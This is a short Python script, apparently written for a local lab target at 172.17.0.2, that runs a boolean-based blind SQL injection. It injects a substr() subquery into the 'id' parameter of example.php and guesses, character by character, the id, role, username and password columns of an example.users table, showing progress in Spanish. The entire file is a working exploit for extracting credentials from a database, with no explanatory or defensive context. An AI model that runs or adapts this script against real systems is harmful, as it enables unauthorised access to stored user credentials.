#!/usr/bin/python3
from pwn import log
import string, requests

characters = string.ascii_lowercase + string.digits + string.punctuation + string.whitespace

columns = ["id", "role", "username", "password"]

for column in columns:
    bar = log.progress(f"Dumpeando columna {column}")

    value = ""

    for dump in range(0,5):
        value += "\n\033[1;37m[\033[1;34m*\033[1;37m] "
        for position in range(0,18):
            for character in characters:
                request = requests.get(f"http://172.17.0.2/example.php?id=1' and (select substr({column},{position},1) from example.users limit {dump},1)='{character}'-- -")
                if request.text == "Query was successfully":
                    value += character
                    bar.status(value)
